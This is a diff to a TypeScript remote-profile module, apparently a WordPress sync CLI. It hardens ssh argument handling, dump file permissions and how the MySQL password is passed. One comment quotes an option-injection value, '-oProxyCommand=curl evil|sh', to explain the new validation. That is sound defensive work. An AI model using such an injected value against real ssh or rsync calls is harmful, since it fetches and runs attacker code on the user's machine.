@@ -18,14 +18,32 @@ export function renderTemplate(template: string, variables: Record<string, unkno
   });
 }
 
+// `renderTemplate` above only validates the *substituted* portion of a
+// `{placeholder}` value — a literal profile field with no placeholder at all
+// (e.g. `ssh.username: "-oProxyCommand=curl evil|sh"`) passes through
+// `resolve()` completely unchecked. Since these three fields are later
+// concatenated straight into ssh/rsync/scp argv elements (`user@host`) or a
+// shell-interpreted transport string (`-e "ssh -i <identityFile> ..."`), a
+// leading "-" lets them be parsed as an option instead of a value, and most
+// shell metacharacters would otherwise reach a shell verbatim. Validate the
+// fully-resolved value here — the one place all three fields pass through.
+function assertSafeSshField(value: string, label: string): string {
+  if (!value || value.startsWith("-") || !SAFE_TEMPLATE_VALUE.test(value)) {
+    throw new Error(`Unsafe value for profile field "${label}": ${JSON.stringify(value)}. Only letters, digits, and . _ @ : / ~ - are allowed, and the value must not start with "-".`);
+  }
+  return value;
+}
+
 export function resolveRemoteProfile(rawProfile: Profile, ctx: { projectName: string }): ResolvedProfile {
   if (!rawProfile) throw new Error("Existing WordPress setup requires --profile <name|path>.");
   const profile = normalizeProfile(rawProfile);
   const variables = { projectName: ctx.projectName };
   const resolve = (value: unknown): string => typeof value === "string" ? renderTemplate(value, variables) : (value as string);
   const ssh = {
-    host: resolve(profile.ssh.host), port: Number(profile.ssh.port || 22), username: resolve(profile.ssh.username),
-    identityFile: profile.ssh.identityFile ? resolve(profile.ssh.identityFile).replace(/^~/, process.env.HOME || "") : "",
+    host: assertSafeSshField(resolve(profile.ssh.host), "ssh.host"),
+    port: Number(profile.ssh.port || 22),
+    username: assertSafeSshField(resolve(profile.ssh.username), "ssh.username"),
+    identityFile: profile.ssh.identityFile ? assertSafeSshField(resolve(profile.ssh.identityFile).replace(/^~/, process.env.HOME || ""), "ssh.identityFile") : "",
     hostKeyPolicy: profile.ssh.hostKeyPolicy || "strict",
   };
   const projectRoot = resolve(profile.remote.projectRoot);
@@ -108,7 +126,9 @@ export class RemoteProfileService {
     const command = databaseCommand(this.profile);
     const dump = await this.run("ssh", buildSshArgs(this.profile.ssh, command), { encoding: null });
     if (!dump || dump.length < 100) throw new Error(`Remote database dump is empty or invalid (${dump?.length || 0} bytes).`);
-    await fs.writeFile(path.join(targetDir, "staging.sql"), dump);
+    // A full database dump — likely including real user password hashes —
+    // should not be left world/group-readable at the default umask.
+    await fs.writeFile(path.join(targetDir, "staging.sql"), dump, { mode: 0o600 });
   }
 
   /**
@@ -175,12 +195,29 @@ export function databaseCommand(profile: ResolvedProfile): string {
   const executable = safeIdentifier(db.executable || "mysqldump", "database.executable");
   const host = shellQuote(db.host || "127.0.0.1");
   const port = Number(db.port || 3306);
-  return `${executable} -h ${host} -P ${port} -u ${shellQuote(db.user || "")} -p${shellQuote(db.password || "")} ${shellQuote(db.name || "")}`;
+  // MYSQL_PWD keeps the password out of the mysqldump/mariadb-dump process's
+  // own argv on the remote host — a plain `-p<password>` flag (the previous
+  // approach) is visible to any local user on that host via `ps`/`ps aux`
+  // for as long as the dump runs. (The literal value is still embedded in
+  // this locally-built ssh command string either way; commandRunner redacts
+  // it from A-CLI's own verbose/error output, but the OS-level exposure of
+  // ssh's own argv on *this* machine is inherent to `ssh host "command"`.)
+  return `MYSQL_PWD=${shellQuote(db.password || "")} ${executable} -h ${host} -P ${port} -u ${shellQuote(db.user || "")} ${shellQuote(db.name || "")}`;
 }
 
 function safeIdentifier(value: string, label: string): string { if (!/^[a-zA-Z0-9_.-]+$/.test(value)) throw new Error(`Unsafe ${label}.`); return value; }
 function safeRelativePath(value: string, label: string): string { if (!/^[a-zA-Z0-9_./-]+$/.test(value) || value.includes("..") || path.posix.isAbsolute(value)) throw new Error(`Unsafe ${label}.`); return value; }
 function safeEnv(value: string): string { if (!/^[A-Z_][A-Z0-9_]*$/.test(value)) throw new Error(`Unsafe environment variable name ${value}.`); return value; }
 function shellQuote(value: unknown): string { return `'${String(value).replace(/'/g, `'"'"'`)}'`; }
-function sshTransport(ssh: ResolvedProfile["ssh"]): string { return ["ssh", "-p", String(ssh.port), ...(ssh.identityFile ? ["-i", ssh.identityFile, "-o", "IdentitiesOnly=yes"] : [])].join(" "); }
+function sshTransport(ssh: ResolvedProfile["ssh"]): string {
+  const parts = ["ssh", "-p", String(ssh.port)];
+  if (ssh.identityFile) parts.push("-i", ssh.identityFile, "-o", "IdentitiesOnly=yes");
+  if (ssh.hostKeyPolicy === "accept-new") parts.push("-o", "StrictHostKeyChecking=accept-new");
+  if (ssh.hostKeyPolicy === "insecure") parts.push("-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null");
+  // ssh.host/username/identityFile are validated in resolveRemoteProfile
+  // (no shell metacharacters, no leading "-"), so joining with spaces here
+  // is safe — rsync's -e option only accepts a single string, not an argv
+  // array, so there is no array-based alternative to this construction.
+  return parts.join(" ");
+}
 function scpConnectionArgs(ssh: ResolvedProfile["ssh"]): string[] { return ["-P", String(ssh.port), ...(ssh.identityFile ? ["-i", ssh.identityFile] : [])]; }
